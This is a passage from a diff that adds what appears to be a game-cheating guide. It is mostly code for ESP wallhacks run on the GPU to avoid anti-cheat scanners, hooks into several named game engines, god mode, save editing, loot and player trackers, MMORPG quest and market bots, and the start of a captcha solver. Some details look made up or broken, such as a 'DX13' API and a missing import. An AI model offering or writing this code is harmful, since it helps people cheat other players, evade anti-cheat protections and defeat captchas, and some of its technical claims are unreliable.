+    id<MTLFunction> function = [library newFunctionWithName:@"readGameMemory"];
+    id<MTLComputePipelineState> pipeline = [device newComputePipelineStateWithFunction:function error:&error];
+    
+    // Execute kernel
+    id<MTLCommandBuffer> commandBuffer = [commandQueue commandBuffer];
+    id<MTLComputeCommandEncoder> encoder = [commandBuffer computeCommandEncoder];
+    
+    [encoder setComputePipelineState:pipeline];
+    [encoder setBuffer:gamePositionBuffer offset:0 atIndex:0];
+    [encoder setBuffer:outputBuffer offset:0 atIndex:1];
+    [encoder dispatchThreadgroups:MTLSizeMake(1024, 1, 1) threadsPerThreadgroup:MTLSizeMake(64, 1, 1)];
+    [encoder endEncoding];
+    [commandBuffer commit];
+}
+```
+
+---
+
+### GPU Compute-Based ESP (Invisible to CPU Scanners)
+
+Run ESP detection entirely on GPU to avoid CPU memory scanning by anti-cheat.
+
+#### CUDA-Based Player Detection
+
+```cpp
+#include <cuda_runtime.h>
+#include <device_launch_parameters.h>
+
+__global__ void detectPlayers(float4* positions, int playerCount, float3 cameraPos, bool* visible, float* distances) {
+    int idx = blockIdx.x * blockDim.x + threadIdx.x;
+    if (idx >= playerCount) return;
+    
+    float4 pos = positions[idx];
+    
+    // Calculate distance
+    float dx = pos.x - cameraPos.x;
+    float dy = pos.y - cameraPos.y;
+    float dz = pos.z - cameraPos.z;
+    float dist = sqrtf(dx*dx + dy*dy + dz*dz);
+    
+    distances[idx] = dist;
+    
+    // Check visibility (simplified - real implementation would raytrace)
+    visible[idx] = (dist < 100.0f);
+}
+
+void RunESPOnGPU(ID3D12Resource* positionBuffer, int playerCount) {
+    // Map D3D12 buffer to CUDA
+    cudaExternalMemory_t extMem;
+    cudaExternalMemoryHandleDesc memDesc = {};
+    memDesc.type = cudaExternalMemoryHandleTypeD3D12Resource;
+    memDesc.handle.win32.handle = GetSharedHandle(positionBuffer);
+    cudaImportExternalMemory(&extMem, &memDesc);
+    
+    // Get device pointer
+    float4* d_positions;
+    cudaExternalMemoryGetMappedBuffer((void**)&d_positions, extMem, NULL);
+    
+    // Allocate output
+    bool* d_visible;
+    float* d_distances;
+    cudaMalloc(&d_visible, playerCount * sizeof(bool));
+    cudaMalloc(&d_distances, playerCount * sizeof(float));
+    
+    // Launch kernel
+    int threadsPerBlock = 256;
+    int blocks = (playerCount + threadsPerBlock - 1) / threadsPerBlock;
+    
+    float3 cameraPos = GetCameraPosition();
+    detectPlayers<<<blocks, threadsPerBlock>>>(d_positions, playerCount, cameraPos, d_visible, d_distances);
+    
+    // Copy results
+    bool* h_visible = new bool[playerCount];
+    cudaMemcpy(h_visible, d_visible, playerCount * sizeof(bool), cudaMemcpyDeviceToHost);
+    
+    // Render ESP based on GPU results
+    RenderESPFromGPUData(h_visible, playerCount);
+}
+```
+
+#### OpenCL Compute ESP
+
+```cpp
+const char* espKernel = R"(
+    __kernel void processESP(
+        __global float4* playerPositions,
+        __global float4* playerBounds,
+        __constant float16* viewProjection,
+        __global float2* screenPositions,
+        int playerCount
+    ) {
+        int gid = get_global_id(0);
+        if (gid >= playerCount) return;
+        
+        // Transform world position to screen
+        float4 pos = playerPositions[gid];
+        float4 projected = viewProjection * pos;
+        
+        if (projected.w > 0) {
+            screenPositions[gid].x = (projected.x / projected.w) * 0.5f + 0.5f;
+            screenPositions[gid].y = (projected.y / projected.w) * 0.5f + 0.5f;
+        }
+    }
+)";
+
+void SetupOpenCLESP() {
+    cl_platform_id platform;
+    clGetPlatformIDs(1, &platform, NULL);
+    
+    cl_device_id device;
+    clGetDeviceIDs(platform, CL_DEVICE_TYPE_GPU, 1, &device, NULL);
+    
+    cl_context context = clCreateContext(NULL, 1, &device, NULL, NULL, NULL);
+    cl_command_queue queue = clCreateCommandQueue(context, device, 0, NULL);
+    
+    // Compile kernel
+    cl_program program = clCreateProgramWithSource(context, 1, &espKernel, NULL, NULL);
+    clBuildProgram(program, 1, &device, NULL, NULL, NULL);
+    cl_kernel kernel = clCreateKernel(program, "processESP", NULL);
+    
+    // Create buffers
+    cl_mem posBuffer = clCreateBuffer(context, CL_MEM_READ_ONLY, sizeof(float4) * 64, NULL, NULL);
+    cl_mem screenBuffer = clCreateBuffer(context, CL_MEM_WRITE_ONLY, sizeof(float2) * 64, NULL, NULL);
+    
+    // Set arguments and execute
+    clSetKernelArg(kernel, 0, sizeof(cl_mem), &posBuffer);
+    clSetKernelArg(kernel, 3, sizeof(cl_mem), &screenBuffer);
+    
+    size_t globalSize = 64;
+    clEnqueueNDRangeKernel(queue, kernel, 1, NULL, &globalSize, NULL, 0, NULL, NULL);
+}
+```
+
+---
+
+### Graphics API Comparison
+
+| API        | Hook Point           | Difficulty | Detection Risk | Performance |
+|------------|---------------------|------------|----------------|-------------|
+| DX9        | EndScene/Present    | Easy       | High           | Good        |
+| DX11       | Present             | Easy       | High           | Good        |
+| DX12       | ExecuteCommandLists | Hard       | Medium         | Excellent   |
+| DX13/DXR   | DispatchRays        | Very Hard  | Low            | Excellent   |
+| Vulkan     | vkQueuePresentKHR   | Medium     | Medium         | Excellent   |
+| OpenGL     | wglSwapBuffers      | Easy       | High           | Good        |
+| Metal      | presentDrawable     | Medium     | Low            | Excellent   |
+| GPU Compute| N/A (Invisible)     | Very Hard  | Very Low       | Excellent   |
+
+---
+
+## Advanced Game Engine Reverse Engineering
+
+Deep dives into modern game engines with architecture-specific exploitation techniques.
+
+### Source Engine 2 (CS2, Dota 2)
+
+Source 2 uses a completely redesigned architecture with schema system for entity reflection.
+
+#### Schema System Exploitation
+
+```cpp
+// Source 2 schema provides runtime type information
+class CSchemaSystem {
+public:
+    CSchemaClassInfo* FindTypeScopeForModule(const char* moduleName);
+};
+
+// Dump all entity classes
+void DumpSchemaSystem() {
+    CSchemaSystem* pSchemaSystem = GetSchemaSystem();
+    
+    CSchemaClassInfo* pClassInfo = pSchemaSystem->FindTypeScopeForModule("client.dll");
+    
+    for (auto& classBinding : pClassInfo->m_ClassBindings) {
+        printf("Class: %s\n", classBinding.m_pClassName);
+        
+        // Enumerate fields
+        for (int i = 0; i < classBinding.m_nFieldCount; i++) {
+            SchemaClassFieldData_t& field = classBinding.m_pFields[i];
+            printf("  Field: %s (Offset: 0x%X, Type: %s)\n", 
+                   field.m_pName, field.m_nOffset, field.m_pType->m_pTypeName);
+        }
+    }
+}
+```
+
+#### Networked Entity Hooking
+
+```cpp
+// Hook entity creation to monitor players
+typedef void* (*CreateNetworkEntity_t)(const char* className, int index);
+CreateNetworkEntity_t oCreateNetworkEntity;
+
+void* hkCreateNetworkEntity(const char* className, int index) {
+    void* entity = oCreateNetworkEntity(className, index);
+    
+    if (strcmp(className, "CCSPlayerPawn") == 0) {
+        // Track player entity
+        g_PlayerEntities[index] = entity;
+        
+        // Read position offset from schema
+        int posOffset = GetSchemaOffset("CCSPlayerPawn", "m_vPosition");
+        Vector* pPos = (Vector*)((uintptr_t)entity + posOffset);
+        
+        printf("Player spawned at: %.2f, %.2f, %.2f\n", pPos->x, pPos->y, pPos->z);
+    }
+    
+    return entity;
+}
+```
+
+#### Panorama UI Injection
+
+```cpp
+// Source 2 uses Panorama (HTML/CSS/JS UI)
+void InjectPanoramaPanel() {
+    IPanoramaUIEngine* pPanorama = GetPanoramaUIEngine();
+    
+    // Create custom panel
+    const char* panelXML = R"(
+        <Panel class="ESP-Panel">
+            <Label id="player-info" text="ESP Active" />
+            <Canvas id="esp-canvas" />
+        </Panel>
+    )";
+    
+    IUIPanel* pPanel = pPanorama->CreatePanel(panelXML, "HudRoot");
+    
+    // Hook JavaScript context
+    v8::Isolate* isolate = pPanorama->GetV8Isolate();
+    v8::HandleScope scope(isolate);
+    
+    // Inject ESP rendering function
+    const char* espScript = R"(
+        $.RegisterForUnhandledEvent('PaintWorld', function() {
+            var players = GameStateAPI.GetPlayerPositions();
+            players.forEach(function(player) {
+                DrawESPBox(player.x, player.y, player.z);
+            });
+        });
+    )";
+    
+    pPanorama->ExecuteScript(espScript);
+}
+```
+
+---
+
+### Frostbite Engine (Battlefield, FIFA)
+
+Frostbite uses an entity-component system with a complex reflection architecture.
+
+#### Entity Bus Traversal
+
+```cpp
+// Frostbite uses EntityBus for entity management
+class ClientGameContext {
+public:
+    ClientPlayerManager* m_pPlayerManager;  // +0x30
+};
+
+class ClientPlayerManager {
+public:
+    ClientPlayer** m_ppPlayers;  // +0x98
+    uint32_t m_playerCount;      // +0xA0
+};
+
+class ClientPlayer {
+public:
+    ClientSoldierEntity* m_pSoldier;  // +0x1478 (BF2042)
+    char m_name[16];                   // +0x40
+};
+
+void DumpAllPlayers() {
+    ClientGameContext* pGameContext = *(ClientGameContext**)GetGameContextPtr();
+    ClientPlayerManager* pPlayerMgr = pGameContext->m_pPlayerManager;
+    
+    for (uint32_t i = 0; i < pPlayerMgr->m_playerCount; i++) {
+        ClientPlayer* pPlayer = pPlayerMgr->m_ppPlayers[i];
+        
+        if (pPlayer && pPlayer->m_pSoldier) {
+            LinearTransform* pTransform = pPlayer->m_pSoldier->GetTransform();
+            Vector3 pos = pTransform->GetPosition();
+            
+            printf("Player: %s at (%.2f, %.2f, %.2f)\n", 
+                   pPlayer->m_name, pos.x, pos.y, pos.z);
+        }
+    }
+}
+```
+
+#### TypeInfo Reflection
+
+```cpp
+// Frostbite TypeInfo system provides RTTI
+class TypeInfo {
+public:
+    const char* m_pName;
+    TypeInfo* m_pParent;
+    uint16_t m_fieldCount;
+    FieldInfo* m_pFields;
+};
+
+class FieldInfo {
+public:
+    const char* m_pName;
+    uint16_t m_offset;
+    TypeInfo* m_pTypeInfo;
+};
+
+// Automatically resolve offsets
+int FindOffset(const char* className, const char* fieldName) {
+    TypeInfo* pTypeInfo = FindTypeInfo(className);
+    
+    for (int i = 0; i < pTypeInfo->m_fieldCount; i++) {
+        if (strcmp(pTypeInfo->m_pFields[i].m_pName, fieldName) == 0) {
+            return pTypeInfo->m_pFields[i].m_offset;
+        }
+    }
+    
+    return -1;
+}
+```
+
+#### Havok Physics Manipulation
+
+```cpp
+// Frostbite uses Havok for physics
+class hkpWorld {
+public:
+    hkArray<hkpRigidBody*> m_rigidBodies;
+};
+
+void DisableGravity() {
+    hkpWorld* pPhysicsWorld = GetHavokWorld();
+    
+    for (int i = 0; i < pPhysicsWorld->m_rigidBodies.getSize(); i++) {
+        hkpRigidBody* pBody = pPhysicsWorld->m_rigidBodies[i];
+        
+        // Set gravity factor to 0
+        pBody->setGravityFactor(0.0f);
+        
+        // Or directly modify velocity
+        hkVector4 zero; zero.setZero();
+        pBody->setLinearVelocity(zero);
+    }
+}
+```
+
+---
+
+### REDengine (Cyberpunk 2077)
+
+REDengine uses RTTI with extensive script integration.
+
+#### RTTI Dump
+
+```cpp
+// REDengine RTTI structure
+struct CClass {
+    const char* name;
+    CClass* parent;
+    CProperty** properties;
+    uint32_t propertyCount;
+    CFunction** functions;
+    uint32_t functionCount;
+};
+
+struct CProperty {
+    const char* name;
+    CName type;
+    uint32_t offset;
+    uint32_t flags;
+};
+
+void DumpRTTI() {
+    CRTTISystem* rtti = CRTTISystem::Get();
+    
+    // Iterate all classes
+    for (auto& kv : rtti->m_classes) {
+        CClass* pClass = kv.second;
+        
+        printf("Class: %s (Parent: %s)\n", 
+               pClass->name, 
+               pClass->parent ? pClass->parent->name : "None");
+        
+        // Dump properties
+        for (uint32_t i = 0; i < pClass->propertyCount; i++) {
+            CProperty* prop = pClass->properties[i];
+            printf("  +0x%X: %s %s\n", prop->offset, prop->type.ToString(), prop->name);
+        }
+    }
+}
+```
+
+#### Script Hook Injection
+
+```cpp
+// Hook RED4ext scripting system
+using ScriptFunction_t = void (*)(IScriptable*, CStackFrame*, void*, void*);
+
+void HookScriptFunction(const char* className, const char* funcName, ScriptFunction_t hook) {
+    CClass* pClass = CRTTISystem::Get()->GetClass(CName(className));
+    CFunction* pFunc = pClass->GetFunction(CName(funcName));
+    
+    // Replace function pointer
+    *(ScriptFunction_t*)&pFunc->m_pFunc = hook;
+}
+
+// Hook player damage
+void Hook_ApplyDamage(IScriptable* context, CStackFrame* frame, void* ret, void* unk) {
+    float damage;
+    frame->GetParameter(&damage);
+    
+    // Nullify damage (god mode)
+    damage = 0.0f;
+    
+    // Continue with modified parameter
+    Original_ApplyDamage(context, frame, &damage, unk);
+}
+```
+
+#### Save Game Modification
+
+```cpp
+// Cyberpunk save structure
+struct SaveHeader {
+    uint32_t magic;  // 'SAVE'
+    uint32_t version;
+    uint64_t timestamp;
+    char characterName[64];
+};
+
+struct InventoryItem {
+    uint64_t itemId;
+    uint32_t quantity;
+    uint32_t quality;  // 0=Common, 1=Uncommon, 2=Rare, 3=Epic, 4=Legendary
+};
+
+void ModifySave(const char* savePath) {
+    std::ifstream file(savePath, std::ios::binary);
+    std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)), 
+                               std::istreambuf_iterator<char>());
+    
+    // Find inventory section (signature scan)
+    const uint8_t inventoryMarker[] = {0x49, 0x4E, 0x56, 0x54};  // "INVT"
+    auto it = std::search(data.begin(), data.end(), 
+                          std::begin(inventoryMarker), std::end(inventoryMarker));
+    
+    if (it != data.end()) {
+        size_t offset = std::distance(data.begin(), it) + 4;
+        
+        // Modify all items to legendary
+        for (size_t i = offset; i < data.size() - sizeof(InventoryItem); i += sizeof(InventoryItem)) {
+            InventoryItem* item = (InventoryItem*)&data[i];
+            if (item->itemId != 0) {
+                item->quality = 4;  // Legendary
+                item->quantity = 999;
+            }
+        }
+    }
+    
+    // Write modified save
+    std::ofstream outFile(savePath, std::ios::binary);
+    outFile.write((char*)data.data(), data.size());
+}
+```
+
+---
+
+### id Tech (Doom Eternal, Quake Champions)
+
+id Tech engines are known for their performance and moddability.
+
+#### Entity System Reversing
+
+```cpp
+// id Tech entity structure
+struct idEntity {
+    int entityNumber;
+    int entityDefNumber;
+    const char* name;
+    idVec3 origin;
+    idMat3 axis;
+    int health;
+    int maxHealth;
+};
+
+// Game uses entity dictionary
+class idGameLocal {
+public:
+    idEntity* entities[MAX_GENTITIES];
+    int numEntities;
+};
+
+void ScanEntities() {
+    idGameLocal* game = GetGameLocal();
+    
+    for (int i = 0; i < game->numEntities; i++) {
+        idEntity* ent = game->entities[i];
+        
+        if (ent && ent->health > 0) {
+            printf("Entity %d: %s at (%.2f, %.2f, %.2f) HP: %d/%d\n",
+                   ent->entityNumber,
+                   ent->name,
+                   ent->origin.x, ent->origin.y, ent->origin.z,
+                   ent->health, ent->maxHealth);
+        }
+    }
+}
+```
+
+#### Console Command Injection
+
+```cpp
+// id Tech console system
+class idCmdSystem {
+public:
+    virtual void ExecuteCommand(const char* cmd) = 0;
+    virtual void AddCommand(const char* name, void (*func)(const idCmdArgs&)) = 0;
+};
+
+void RegisterCheatCommands() {
+    idCmdSystem* cmdSystem = GetCmdSystem();
+    
+    // Add god mode command
+    cmdSystem->AddCommand("god", [](const idCmdArgs& args) {
+        idPlayer* player = GetLocalPlayer();
+        player->godmode = !player->godmode;
+        printf("God mode: %s\n", player->godmode ? "ON" : "OFF");
+    });
+    
+    // Add noclip
+    cmdSystem->AddCommand("noclip", [](const idCmdArgs& args) {
+        idPlayer* player = GetLocalPlayer();
+        player->noclip = !player->noclip;
+        player->physicsObj.SetClipModel(nullptr);
+    });
+    
+    // Give all weapons
+    cmdSystem->AddCommand("give all", [](const idCmdArgs& args) {
+        idPlayer* player = GetLocalPlayer();
+        for (int i = 0; i < WEAPON_COUNT; i++) {
+            player->GiveWeapon(i);
+        }
+    });
+}
+```
+
+#### .resources File Manipulation
+
+```cpp
+// id Tech 7 uses .resources container format
+struct ResourceHeader {
+    uint64_t magic;  // 'idResource'
+    uint32_t version;
+    uint32_t fileCount;
+    uint64_t stringsOffset;
+    uint64_t dataOffset;
+};
+
+struct ResourceEntry {
+    uint64_t nameHash;
+    uint64_t offset;
+    uint64_t compressedSize;
+    uint64_t uncompressedSize;
+    uint32_t compressionType;  // 0=None, 1=Oodle, 2=Zlib
+};
+
+void ExtractResources(const char* resourcePath) {
+    std::ifstream file(resourcePath, std::ios::binary);
+    
+    ResourceHeader header;
+    file.read((char*)&header, sizeof(header));
+    
+    for (uint32_t i = 0; i < header.fileCount; i++) {
+        ResourceEntry entry;
+        file.read((char*)&entry, sizeof(entry));
+        
+        // Read compressed data
+        std::vector<uint8_t> compressed(entry.compressedSize);
+        file.seekg(entry.offset);
+        file.read((char*)compressed.data(), entry.compressedSize);
+        
+        // Decompress (Oodle)
+        std::vector<uint8_t> decompressed(entry.uncompressedSize);
+        OodleLZ_Decompress(compressed.data(), entry.compressedSize,
+                          decompressed.data(), entry.uncompressedSize);
+        
+        // Save file
+        char filename[256];
+        sprintf(filename, "extracted/%016llX.bin", entry.nameHash);
+        std::ofstream out(filename, std::ios::binary);
+        out.write((char*)decompressed.data(), entry.uncompressedSize);
+    }
+}
+```
+
+---
+
+### Godot 4 Deep Dive
+
+Godot is open-source, making reverse engineering easier but still requires understanding its architecture.
+
+#### GDScript Bytecode Modification
+
+```python
+# Decompile .pck files
+import struct
+
+def extract_pck(pck_path):
+    with open(pck_path, 'rb') as f:
+        # Read PCK header
+        magic = f.read(4)  # 'GDPC'
+        version = struct.unpack('<I', f.read(4))[0]
+        
+        # Skip to file table
+        f.seek(16)
+        file_count = struct.unpack('<I', f.read(4))[0]
+        
+        for i in range(file_count):
+            # Read file entry
+            path_len = struct.unpack('<I', f.read(4))[0]
+            path = f.read(path_len).decode('utf-8')
+            
+            offset = struct.unpack('<Q', f.read(8))[0]
+            size = struct.unpack('<Q', f.read(8))[0]
+            
+            # Extract file
+            current_pos = f.tell()
+            f.seek(offset)
+            data = f.read(size)
+            
+            # Save extracted file
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            with open(path, 'wb') as out:
+                out.write(data)
+            
+            f.seek(current_pos)
+```
+
+#### Node Tree Manipulation
+
+```cpp
+// Hook Godot node system
+class Node {
+public:
+    String name;
+    Node* parent;
+    Vector<Node*> children;
+    
+    virtual void _process(float delta) = 0;
+};
+
+// Find player node
+Node* FindPlayerNode() {
+    Node* root = SceneTree::get_singleton()->get_root();
+    return root->find_node("Player", true, false);
+}
+
+// Inject cheat node
+class CheatNode : public Node {
+public:
+    void _process(float delta) override {
+        // Get player
+        Node* player = FindPlayerNode();
+        
+        if (player) {
+            // Modify health
+            Variant health = player->get("health");
+            player->set("health", 999);
+            
+            // Teleport
+            if (Input::is_key_pressed(KEY_T)) {
+                Vector3 pos = player->get("position");
+                pos.y += 10;
+                player->set("position", pos);
+            }
+        }
+    }
+};
+```
+
+#### GDExtension Hook
+
+```cpp
+// Create GDExtension to hook Godot functions
+#include <godot_cpp/godot.hpp>
+#include <godot_cpp/core/class_db.hpp>
+
+class CheatExtension : public Node {
+    GDCLASS(CheatExtension, Node)
+    
+protected:
+    static void _bind_methods() {
+        ClassDB::bind_method(D_METHOD("enable_esp"), &CheatExtension::enable_esp);
+    }
+    
+public:
+    void enable_esp() {
+        // Hook rendering
+        RenderingServer* rs = RenderingServer::get_singleton();
+        
+        // Get all Character3D nodes
+        Array players = get_tree()->get_nodes_in_group("players");
+        
+        for (int i = 0; i < players.size(); i++) {
+            Node3D* player = Object::cast_to<Node3D>(players[i]);
+            
+            if (player) {
+                // Create ESP box
+                MeshInstance3D* box = memnew(MeshInstance3D);
+                BoxMesh* mesh = memnew(BoxMesh);
+                box->set_mesh(mesh);
+                
+                // Make it render through walls
+                StandardMaterial3D* mat = memnew(StandardMaterial3D);
+                mat->set_flag(StandardMaterial3D::FLAG_DISABLE_DEPTH_TEST, true);
+                mat->set_albedo(Color(1, 0, 0, 0.5));
+                box->set_material_override(mat);
+                
+                player->add_child(box);
+            }
+        }
+    }
+};
+```
+
+---
+
+### Engine Comparison Matrix
+
+| Engine      | Reflection | Scripting   | Moddability | RE Difficulty |
+|-------------|-----------|-------------|-------------|---------------|
+| Source 2    | Schema    | Lua/JS      | Medium      | Medium        |
+| Frostbite   | TypeInfo  | Limited     | Low         | Hard          |
+| REDengine   | RTTI      | RED4ext     | Medium      | Medium        |
+| id Tech     | None      | Console     | High        | Easy          |
+| Godot       | Full      | GDScript    | Very High   | Very Easy     |
+| Unreal      | Reflection| Blueprints  | High        | Easy          |
+| Unity       | Reflection| C#          | Very High   | Easy          |
+
+---
+
+## Genre-Specific Exploitation Techniques
+
+Different game genres require specialized approaches due to unique mechanics and netcode.
+
+### Battle Royale (Fortnite, PUBG, Apex, Warzone)
+
+#### Zone Prediction & Circle ESP
+
+```python
+import numpy as np
+
+class ZonePredictor:
+    def __init__(self):
+        self.zone_history = []
+        
+    def predict_next_zone(self, current_zone, prev_zone):
+        # Analyze zone shrink pattern
+        center_current = np.array(current_zone['center'])
+        center_prev = np.array(prev_zone['center'])
+        
+        # Calculate drift vector
+        drift = center_current - center_prev
+        
+        # Predict next center (zones tend to continue drifting)
+        predicted_center = center_current + drift * 0.8
+        predicted_radius = current_zone['radius'] * 0.5
+        
+        return {
+            'center': predicted_center.tolist(),
+            'radius': predicted_radius,
+            'time_to_shrink': current_zone['time_remaining']
+        }
+    
+    def optimal_rotation_path(self, player_pos, predicted_zone):
+        # Calculate shortest safe path considering terrain
+        path = []
+        current = np.array(player_pos)
+        target = np.array(predicted_zone['center'])
+        
+        # A* pathfinding with zone damage avoidance
+        while np.linalg.norm(current - target) > 10:
+            direction = (target - current) / np.linalg.norm(target - current)
+            current += direction * 5
+            path.append(current.tolist())
+        
+        return path
+```
+
+#### Loot ESP with Priority System
+
+```cpp
+// Hook loot spawn system
+struct LootItem {
+    Vector3 position;
+    uint32_t itemId;
+    uint32_t rarity;  // 0=Common, 1=Rare, 2=Epic, 3=Legendary
+    char name[64];
+};
+
+class LootESP {
+private:
+    std::vector<LootItem> m_items;
+    
+public:
+    void ScanLootItems() {
+        UWorld* world = GetWorld();
+        TArray<AActor*> actors;
+        UGameplayStatics::GetAllActorsOfClass(world, ALootItem::StaticClass(), actors);
+        
+        m_items.clear();
+        for (AActor* actor : actors) {
+            ALootItem* loot = Cast<ALootItem>(actor);
+            
+            LootItem item;
+            item.position = loot->GetActorLocation();
+            item.itemId = loot->GetItemID();
+            item.rarity = loot->GetRarity();
+            strcpy(item.name, loot->GetItemName());
+            
+            // Priority filtering
+            if (item.rarity >= 2 || IsWeapon(item.itemId)) {
+                m_items.push_back(item);
+            }
+        }
+    }
+    
+    void Render() {
+        for (const auto& item : m_items) {
+            // Distance culling
+            float distance = Vector3::Distance(item.position, GetLocalPlayerPosition());
+            if (distance > 200.0f) continue;
+            
+            // World to screen
+            Vector2 screen;
+            if (WorldToScreen(item.position, screen)) {
+                // Color by rarity
+                ImVec4 color = GetRarityColor(item.rarity);
+                
+                // Draw box and text
+                ImGui::GetBackgroundDrawList()->AddCircleFilled(
+                    ImVec2(screen.x, screen.y), 5, ImGui::ColorConvertFloat4ToU32(color));
+                
+                char label[128];
+                sprintf(label, "%s [%.0fm]", item.name, distance);
+                ImGui::GetBackgroundDrawList()->AddText(
+                    ImVec2(screen.x + 10, screen.y), 
+                    ImGui::ColorConvertFloat4ToU32(color), 
+                    label);
+            }
+        }
+    }
+};
+```
+
+#### Player Count Tracker
+
+```cpp
+// Monitor alive player count for endgame strategy
+class PlayerTracker {
+private:
+    struct PlayerInfo {
+        uint64_t playerId;
+        bool isAlive;
+        Vector3 lastKnownPos;
+        float lastSeenTime;
+    };
+    
+    std::unordered_map<uint64_t, PlayerInfo> m_players;
+    
+public:
+    void Update() {
+        UGameState* gameState = GetGameState();
+        TArray<APlayerState*> playerStates = gameState->PlayerArray;
+        
+        int aliveCount = 0;
+        for (APlayerState* ps : playerStates) {
+            uint64_t id = ps->PlayerId;
+            
+            if (ps->bIsSpectator || ps->bOnlySpectator) {
+                m_players[id].isAlive = false;
+            } else {
+                m_players[id].isAlive = true;
+                m_players[id].playerId = id;
+                aliveCount++;
+                
+                // Update position if visible
+                APawn* pawn = ps->GetPawn();
+                if (pawn) {
+                    m_players[id].lastKnownPos = pawn->GetActorLocation();
+                    m_players[id].lastSeenTime = GetGameTime();
+                }
+            }
+        }
+        
+        // Display info
+        ImGui::Begin("Player Tracker");
+        ImGui::Text("Players Alive: %d/%d", aliveCount, m_players.size());
+        
+        // List recently seen players
+        ImGui::Separator();
+        for (const auto& [id, info] : m_players) {
+            if (!info.isAlive) continue;
+            
+            float timeSinceSeen = GetGameTime() - info.lastSeenTime;
+            if (timeSinceSeen < 30.0f) {
+                ImGui::Text("Player %llu - Last seen %.1fs ago", id, timeSinceSeen);
+            }
+        }
+        ImGui::End();
+    }
+};
+```
+
+---
+
+### MMORPG Bot Automation
+
+#### Mesh Navigation & Pathfinding
+
+```python
+import numpy as np
+from collections import deque
+
+class NavMesh:
+    def __init__(self, mesh_data):
+        self.triangles = mesh_data['triangles']
+        self.vertices = mesh_data['vertices']
+        self.adjacency = self._build_adjacency()
+    
+    def _build_adjacency(self):
+        adj = {}
+        for i, tri in enumerate(self.triangles):
+            adj[i] = []
+            for j, other_tri in enumerate(self.triangles):
+                if i == j:
+                    continue
+                # Check if triangles share an edge
+                shared = set(tri) & set(other_tri)
+                if len(shared) == 2:
+                    adj[i].append(j)
+        return adj
+    
+    def find_path(self, start_pos, end_pos):
+        # Find starting and ending triangles
+        start_tri = self._point_in_triangle(start_pos)
+        end_tri = self._point_in_triangle(end_pos)
+        
+        if start_tri is None or end_tri is None:
+            return None
+        
+        # A* search through nav mesh
+        open_set = [(0, start_tri)]
+        came_from = {}
+        g_score = {start_tri: 0}
+        
+        while open_set:
+            _, current = heapq.heappop(open_set)
+            
+            if current == end_tri:
+                return self._reconstruct_path(came_from, current, start_pos, end_pos)
+            
+            for neighbor in self.adjacency[current]:
+                tentative_g = g_score[current] + self._distance(current, neighbor)
+                
+                if neighbor not in g_score or tentative_g < g_score[neighbor]:
+                    came_from[neighbor] = current
+                    g_score[neighbor] = tentative_g
+                    f_score = tentative_g + self._heuristic(neighbor, end_tri)
+                    heapq.heappush(open_set, (f_score, neighbor))
+        
+        return None
+    
+    def _reconstruct_path(self, came_from, current, start_pos, end_pos):
+        path = [end_pos]
+        
+        while current in came_from:
+            # Get portal between triangles
+            prev = came_from[current]
+            portal = self._get_portal(prev, current)
+            path.append(np.mean(portal, axis=0).tolist())
+            current = prev
+        
+        path.append(start_pos)
+        return list(reversed(path))
+```
+
+#### Quest Automation Framework
+
+```cpp
+class QuestBot {
+private:
+    enum BotState {
+        IDLE,
+        NAVIGATING,
+        COMBAT,
+        LOOTING,
+        TURNING_IN
+    };
+    
+    BotState m_state;
+    std::queue<Vector3> m_path;
+    
+public:
+    void Update(float deltaTime) {
+        switch (m_state) {
+            case IDLE:
+                CheckForQuests();
+                break;
+                
+            case NAVIGATING:
+                FollowPath();
+                if (ReachedDestination()) {
+                    m_state = COMBAT;
+                }
+                break;
+                
+            case COMBAT:
+                EngageEnemies();
+                if (NoEnemiesNearby()) {
+                    m_state = LOOTING;
+                }
+                break;
+                
+            case LOOTING:
+                CollectLoot();
+                if (QuestObjectiveComplete()) {
+                    m_state = TURNING_IN;
+                    PathToQuestGiver();
+                }
+                break;
+                
+            case TURNING_IN:
+                TurnInQuest();
+                m_state = IDLE;
+                break;
+        }
+    }
+    
+    void EngageEnemies() {
+        // Find nearest enemy matching quest criteria
+        NPC* target = FindQuestEnemy();
+        
+        if (target && !target->IsDead()) {
+            // Face target
+            Vector3 direction = target->GetPosition() - GetPlayerPosition();
+            SetPlayerRotation(direction);
+            
+            // Use optimal rotation
+            UseOptimalSkillRotation(target);
+        }
+    }
+    
+    void UseOptimalSkillRotation(NPC* target) {
+        PlayerClass* player = GetLocalPlayer();
+        
+        // Skill priority based on cooldowns and damage
+        if (player->GetSkillCooldown(SKILL_ULTIMATE) == 0 && target->GetHealthPercent() > 0.5f) {
+            player->CastSkill(SKILL_ULTIMATE, target);
+        }
+        else if (player->GetSkillCooldown(SKILL_DOT) == 0) {
+            player->CastSkill(SKILL_DOT, target);
+        }
+        else if (player->GetMana() > 50) {
+            player->CastSkill(SKILL_FILLER, target);
+        }
+        else {
+            player->CastSkill(SKILL_AUTO_ATTACK, target);
+        }
+    }
+};
+```
+
+#### Economy Manipulation & Market Bot
+
+```python
+class MarketBot:
+    def __init__(self, api_client):
+        self.client = api_client
+        self.inventory = {}
+        self.price_history = {}
+        
+    def analyze_market(self):
+        # Fetch current listings
+        listings = self.client.get_auction_house_listings()
+        
+        opportunities = []
+        for item_id, prices in listings.items():
+            # Calculate statistics
+            prices_sorted = sorted([p['price'] for p in prices])
+            median = np.median(prices_sorted)
+            q1 = np.percentile(prices_sorted, 25)
+            
+            # Find underpriced items (below Q1)
+            for listing in prices:
+                if listing['price'] < q1 * 0.9:
+                    profit_margin = (median - listing['price']) / listing['price']
+                    
+                    if profit_margin > 0.2:  # 20% profit margin
+                        opportunities.append({
+                            'item_id': item_id,
+                            'buy_price': listing['price'],
+                            'sell_price': median,
+                            'profit': median - listing['price'],
+                            'listing_id': listing['id']
+                        })
+        
+        # Sort by profit and execute
+        opportunities.sort(key=lambda x: x['profit'], reverse=True)
+        return opportunities[:10]
+    
+    def flip_items(self):
+        opportunities = self.analyze_market()
+        
+        for opp in opportunities:
+            try:
+                # Buy underpriced item
+                self.client.buy_item(opp['listing_id'])
+                
+                # Relist at median price
+                self.client.create_listing(
+                    item_id=opp['item_id'],
+                    price=opp['sell_price'],
+                    quantity=1
+                )
+                
+                print(f"Flipped {opp['item_id']}: Bought {opp['buy_price']}, Sold {opp['sell_price']}, Profit: {opp['profit']}")
+                
+            except Exception as e:
+                print(f"Failed to flip item: {e}")
+```
+
+#### Captcha Bypass (ML-based)
+
+```python
+import tensorflow as tf
+from PIL import Image
+
+class CaptchaSolver:
+    def __init__(self, model_path):
